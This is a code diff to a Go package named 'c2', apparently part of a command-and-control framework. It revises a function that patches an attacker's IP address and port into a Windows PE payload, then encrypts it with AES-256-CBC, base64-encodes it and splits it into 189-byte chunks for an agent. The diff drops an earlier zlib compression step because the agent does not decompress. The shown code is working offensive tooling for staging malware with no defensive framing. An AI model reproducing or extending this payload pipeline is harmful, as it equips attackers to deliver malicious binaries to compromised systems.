@@ -5,7 +5,6 @@ package c2
 
 import (
 	"bytes"
-	"compress/zlib"
 	"crypto/aes"
 	"crypto/cipher"
 	"crypto/rand"
@@ -71,11 +70,11 @@ func ChunkPayload(data []byte, chunkSize int) []string {
 // ProcessPayload runs the full pipeline on a raw PE binary:
 //  1. Patch attacker IP + port into the payload
 //  2. SHA-256 the original (for the manifest integrity field)
-//  3. zlib-compress at level 9
-//  4. AES-256-CBC-encrypt (random IV prepended)
-//  5. Base64-encode
-//  6. Chunk into 189-byte slices
+//  3. AES-256-CBC-encrypt (random IV prepended)
+//  4. Base64-encode
+//  5. Chunk into 189-byte slices
 //
+// Note: no zlib compression — the agent does not decompress.
 // Returns (chunks, hex_sha256_of_original, error).
 func ProcessPayload(rawPayload, aesKey []byte, attackerIP string, attackerPort uint16) ([]string, string, error) {
 	// 1. Patch
@@ -88,41 +87,19 @@ func ProcessPayload(rawPayload, aesKey []byte, attackerIP string, attackerPort u
 	sum := sha256.Sum256(rawPayload)
 	hashHex := hex.EncodeToString(sum[:])
 
-	// 3. Compress
-	compressed, err := zlibCompress(patched)
-	if err != nil {
-		return nil, "", fmt.Errorf("process payload compress: %w", err)
-	}
-
-	// 4. Encrypt
-	encrypted, err := aesCBCEncrypt(compressed, aesKey)
+	// 3. Encrypt
+	encrypted, err := aesCBCEncrypt(patched, aesKey)
 	if err != nil {
 		return nil, "", fmt.Errorf("process payload encrypt: %w", err)
 	}
 
-	// 5. Base64
+	// 4. Base64
 	encoded := base64.StdEncoding.EncodeToString(encrypted)
 
-	// 6. Chunk
+	// 5. Chunk
 	chunks := ChunkPayload([]byte(encoded), 189)
 
 	return chunks, hashHex, nil
-}
-
-// zlibCompress compresses data at level 9 (best compression).
-func zlibCompress(data []byte) ([]byte, error) {
-	var buf bytes.Buffer
-	w, err := zlib.NewWriterLevel(&buf, zlib.BestCompression)
-	if err != nil {
-		return nil, fmt.Errorf("zlib new writer: %w", err)
-	}
-	if _, err := w.Write(data); err != nil {
-		return nil, fmt.Errorf("zlib write: %w", err)
-	}
-	if err := w.Close(); err != nil {
-		return nil, fmt.Errorf("zlib close: %w", err)
-	}
-	return buf.Bytes(), nil
 }
 
 // aesCBCEncrypt encrypts data with AES-256-CBC.
